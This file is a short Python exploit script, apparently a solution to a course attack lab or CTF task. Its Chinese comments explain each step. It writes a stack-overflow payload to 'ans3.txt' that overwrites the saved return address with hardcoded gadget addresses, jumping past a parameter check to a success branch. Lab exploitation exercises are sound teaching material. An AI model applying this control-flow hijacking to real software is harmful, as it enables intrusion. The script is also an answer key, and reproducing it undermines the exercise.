#!/usr/bin/env python3
import struct

p64 = lambda x: struct.pack('<Q', x)

# 地址
jmp_xs = 0x401334
func1_skip_check = 0x40122b  # 跳过参数检查，直接构造成功字符串！

# 构造 payload
payload = b"A" * 32       # 填充缓冲区
payload += b"B" * 8       # saved rbp
payload += p64(jmp_xs)    # 返回地址 → jmp_xs
payload += b"C" * 16      # 填充到 saved_rsp+0x10
payload += p64(func1_skip_check)  # 直接跳到成功分支！

with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"[+] Payload written ({len(payload)} bytes)")
print(f"[+] Jumping to func1+0x15 (skip parameter check)")
print("[+] Testing...")
